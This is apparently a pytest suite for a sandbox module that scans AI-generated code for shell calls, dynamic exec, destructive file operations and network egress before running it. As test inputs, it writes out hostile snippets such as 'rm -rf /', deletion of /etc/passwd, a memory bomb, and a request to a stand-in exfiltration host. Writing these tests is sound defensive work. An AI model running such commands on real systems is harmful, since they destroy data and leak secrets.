"""EXT-037 / REQ-7 (TASK-9) -- ``harness.secure_exec``: secure sandboxed execution of

generated code + gated egress (the foundation for closing the live host-execution gap in
``build_system``'s acceptance step). Offline, deterministic, no real network egress is ever
exercised -- the "egress" snippets here only IMPORT/reference network modules; they are never
actually run against the network.
"""

from __future__ import annotations

import os
import sys
import time

import pytest

from harness.secure_exec import (
    EgressPolicy,
    ScanPolicy,
    run_sandboxed,
    scan_code,
    secure_run_generated,
)

# #EXT-037-REQ-7 Start

_POSIX = sys.platform != "win32"


# --- (a) scan_code flags each category on crafted snippets ----------------------------------


def test_scan_code_flags_os_system():
    report = scan_code("import os\nos.system('echo hi')\n")
    assert report.ok is False
    assert any(v["category"] == "SUBPROCESS/SHELL" for v in report.violations)


def test_scan_code_flags_subprocess():
    report = scan_code("import subprocess\nsubprocess.run(['echo', 'hi'])\n")
    assert report.ok is False
    assert any(v["category"] == "SUBPROCESS/SHELL" for v in report.violations)


def test_scan_code_flags_dynamic_exec_eval_exec_import():
    for snippet in (
        "eval('1+1')\n",
        "exec('x = 1')\n",
        "__import__('os')\n",
        "compile('1+1', '<s>', 'eval')\n",
    ):
        report = scan_code(snippet)
        assert report.ok is False, snippet
        assert any(v["category"] == "DYNAMIC-EXEC" for v in report.violations), snippet


def test_scan_code_flags_shutil_rmtree():
    report = scan_code("import shutil\nshutil.rmtree('/some/dir')\n")
    assert report.ok is False
    assert any(v["category"] == "DESTRUCTIVE/FS-OUTSIDE-ROOT" for v in report.violations)


def test_scan_code_flags_os_remove_and_absolute_open():
    report = scan_code("import os\nos.remove('/etc/passwd')\n")
    assert report.ok is False
    assert any(v["category"] == "DESTRUCTIVE/FS-OUTSIDE-ROOT" for v in report.violations)

    report2 = scan_code("open('/etc/x', 'w')\n")
    assert report2.ok is False
    assert any(v["category"] == "DESTRUCTIVE/FS-OUTSIDE-ROOT" for v in report2.violations)


def test_scan_code_flags_parent_escaping_write():
    report = scan_code("open('../../evil.py', 'w').write('x')\n")
    assert report.ok is False
    assert any(v["category"] == "DESTRUCTIVE/FS-OUTSIDE-ROOT" for v in report.violations)


def test_scan_code_flags_socket_and_requests_imports():
    report = scan_code("import socket\ns = socket.socket()\n")
    assert report.ok is False
    assert any(v["category"] == "NETWORK/EGRESS" for v in report.egress_ops)
    assert any(v["category"] == "NETWORK/EGRESS" for v in report.violations)

    report2 = scan_code("import requests\nrequests.get('http://example.com')\n")
    assert report2.ok is False
    assert any(v["category"] == "NETWORK/EGRESS" for v in report2.egress_ops)


def test_scan_code_clean_cli_is_ok_no_violations():
    code = (
        "import sys\n"
        "def main():\n"
        "    data = sys.stdin.read()\n"
        "    print(data.upper())\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    report = scan_code(code)
    assert report.ok is True
    assert report.violations == []


def test_scan_code_multi_file_dict_and_unparseable_source():
    report = scan_code({"a.py": "print(1)\n", "b.py": "def f(:\n"})
    assert report.ok is False
    assert any(v["category"] == "PARSE-ERROR" for v in report.violations)


def test_scan_code_never_raises_on_garbage_input():
    for garbage in (None, 12345, ["not", "valid"], object()):
        report = scan_code(garbage)  # type: ignore[arg-type]
        assert report.ok is False


def test_scan_policy_can_loosen_a_category_deliberately():
    lenient = ScanPolicy(deny_subprocess=False)
    report = scan_code("import subprocess\nsubprocess.run(['echo'])\n", scan_policy=lenient)
    assert report.ok is True
    assert report.violations == []


# --- (b) egress is GATED, not blocked -------------------------------------------------------


def test_egress_flagged_under_deny_all():
    report = scan_code(
        "import requests\nrequests.get('https://pypi.org')\n",
        egress_policy=EgressPolicy.DENY_ALL,
    )
    assert report.ok is False
    assert any(v["category"] == "NETWORK/EGRESS" for v in report.violations)


def test_egress_permitted_under_allow_list_policy():
    policy = EgressPolicy.allow("pypi.org")
    report = scan_code(
        "import requests\nrequests.get('https://pypi.org')\n",
        egress_policy=policy,
    )
    # Egress ops are still recorded, but do not by themselves flip ok=False when a permitting
    # allow_list policy is supplied.
    assert len(report.egress_ops) >= 1
    assert not any(v["category"] == "NETWORK/EGRESS" for v in report.violations)
    assert report.ok is True


def test_egress_permitted_policy_does_not_hide_other_violations():
    policy = EgressPolicy.allow("pypi.org")
    report = scan_code(
        "import requests\nrequests.get('https://pypi.org')\nimport os\nos.system('rm -rf /')\n",
        egress_policy=policy,
    )
    assert report.ok is False
    assert any(v["category"] == "SUBPROCESS/SHELL" for v in report.violations)
    assert not any(v["category"] == "NETWORK/EGRESS" for v in report.violations)


def test_egress_policy_is_host_allowed():
    deny_all = EgressPolicy.DENY_ALL
    assert deny_all.is_host_allowed("pypi.org") is False
    assert deny_all.is_host_allowed("anything") is False

    allow = EgressPolicy.allow("pypi.org", "docs.python.org")
    assert allow.is_host_allowed("pypi.org") is True
    assert allow.is_host_allowed("PyPI.org") is True  # case-insensitive
    assert allow.is_host_allowed("docs.python.org") is True
    assert allow.is_host_allowed("evil.example.com") is False


def test_egress_allow_list_is_not_a_blanket_pass_unlisted_host_still_violates():
    # CRITICAL security proof: allow('pypi.org') must NOT permit egress to a DIFFERENT,
    # unlisted host -- it grants a policy scoped to pypi.org only, never a blanket pass for
    # every egress operation the scanned code happens to make.
    policy = EgressPolicy.allow("pypi.org")
    report = scan_code(
        "import requests\nrequests.get('http://evil-exfil.example.com/steal')\n",
        egress_policy=policy,
    )
    assert report.ok is False
    egress_violations = [v for v in report.violations if v["category"] == "NETWORK/EGRESS"]
    assert len(egress_violations) >= 1
    assert any(v.get("host") == "evil-exfil.example.com" for v in report.egress_ops)


def test_egress_allow_list_fail_closed_on_non_literal_host():
    # A call whose target host is a variable/expression (not a string literal) cannot be
    # statically proven safe -- it MUST still be flagged as a violation even under an
    # allow_list policy that would otherwise cover the real (unprovable) destination.
    policy = EgressPolicy.allow("pypi.org")
    code = (
        "import requests\n"
        "target = 'http://pypi.org'  # could be reassigned anywhere; not proven at the call site\n"
        "requests.get(target)\n"
    )
    report = scan_code(code, egress_policy=policy)
    assert report.ok is False
    assert any(v["category"] == "NETWORK/EGRESS" for v in report.violations)
    # The recorded egress op for the call itself has no statically-determinable host.
    call_ops = [op for op in report.egress_ops if op.get("kind") == "call"]
    assert any(op.get("host") is None for op in call_ops)


# --- (c) run_sandboxed scrubs the environment ------------------------------------------------


def test_run_sandboxed_scrubs_secrets_but_keeps_path(tmp_path, monkeypatch):
    monkeypatch.setenv("SECRET_TOKEN", "sekret")
    code = (
        "import os\n"
        "print(os.environ.get('SECRET_TOKEN', '<none>'))\n"
        "print('PATH=' + ('yes' if os.environ.get('PATH') else 'no'))\n"
    )
    script = tmp_path / "probe.py"
    script.write_text(code, encoding="utf-8")

    result = run_sandboxed([sys.executable, str(script)], cwd=str(tmp_path), timeout=10)
    assert result["ok"] is True
    assert "<none>" in result["stdout"]
    assert "sekret" not in result["stdout"]
    assert "PATH=yes" in result["stdout"]


def test_run_sandboxed_never_raises_on_garbage_cmd_and_cwd():
    result = run_sandboxed(None, cwd="/does/not/exist/at/all", timeout=5)
    assert result["ok"] is False
    assert result["timed_out"] is False

    result2 = run_sandboxed([sys.executable, "-c", "print(1)"], cwd="Z:\\nope\\nope", timeout=5)
    assert result2["ok"] is False


# --- (d) run_sandboxed enforces the timeout, no orphan ---------------------------------------


def _is_pid_running(pid: int) -> bool:
    if sys.platform == "win32":
        out = __import__("subprocess").run(
            ["tasklist", "/FI", f"PID eq {pid}"], capture_output=True, text=True
        ).stdout
        return str(pid) in out
    try:
        os.kill(pid, 0)
        return True
    except ProcessLookupError:
        return False
    except Exception:
        return False


def test_run_sandboxed_timeout_kills_hanging_child_no_orphan(tmp_path):
    pidfile = tmp_path / "child.pid"
    code = (
        "import os\n"
        f"with open({str(pidfile)!r}, 'w') as f:\n"
        "    f.write(str(os.getpid()))\n"
        "while True:\n"
        "    pass\n"
    )
    script = tmp_path / "hang.py"
    script.write_text(code, encoding="utf-8")

    start = time.monotonic()
    result = run_sandboxed([sys.executable, str(script)], cwd=str(tmp_path), timeout=2)
    elapsed = time.monotonic() - start

    assert result["timed_out"] is True
    assert result["ok"] is False
    assert result["killed"] is True
    assert elapsed < 30

    assert pidfile.exists()
    child_pid = int(pidfile.read_text().strip())
    deadline = time.monotonic() + 5
    while time.monotonic() < deadline and _is_pid_running(child_pid):
        time.sleep(0.2)
    assert not _is_pid_running(child_pid)


@pytest.mark.skipif(not _POSIX, reason="RLIMIT_AS resource caps are POSIX-only")
def test_run_sandboxed_posix_memory_cap_kills_membomb(tmp_path):
    code = (
        "data = []\n"
        "chunk = b'x' * (10 * 1024 * 1024)\n"
        "for _ in range(2000):\n"
        "    data.append(chunk * 1)\n"
        "print('should not get here')\n"
    )
    script = tmp_path / "membomb.py"
    script.write_text(code, encoding="utf-8")

    result = run_sandboxed(
        [sys.executable, str(script)], cwd=str(tmp_path), timeout=15, mem_mb=64
    )
    # Either killed by the RLIMIT_AS cap (non-zero/negative returncode, MemoryError) or the
    # process is refused enough memory to proceed -- in all cases it must not report ok=True
    # having printed the "should not get here" success marker.
    assert "should not get here" not in (result.get("stdout") or "")


# --- (e) secure_run_generated refuses to run violating code, runs clean code -----------------


def test_secure_run_generated_blocks_violating_code(tmp_path):
    sources = {"main.py": "import os\nos.system('echo hi')\n"}
    result = secure_run_generated(sources, [sys.executable, "-c", "print('should not run')"],
                                   cwd=str(tmp_path))
    assert result["blocked"] is True
    assert result["ran"] is False
    assert result["report"].ok is False


def test_secure_run_generated_runs_clean_code(tmp_path):
    sources = {"main.py": "print('clean output')\n"}
    script = tmp_path / "main.py"
    script.write_text(sources["main.py"], encoding="utf-8")
    result = secure_run_generated(sources, [sys.executable, str(script)], cwd=str(tmp_path))
    assert result["blocked"] is False
    assert result["ran"] is True
    assert result["ok"] is True
    assert "clean output" in result["stdout"]


def test_secure_run_generated_never_raises_on_garbage_sources(tmp_path):
    result = secure_run_generated(None, [sys.executable, "-c", "print(1)"], cwd=str(tmp_path))
    assert result["blocked"] is True
    assert result["ran"] is False
# #EXT-037-REQ-7 End
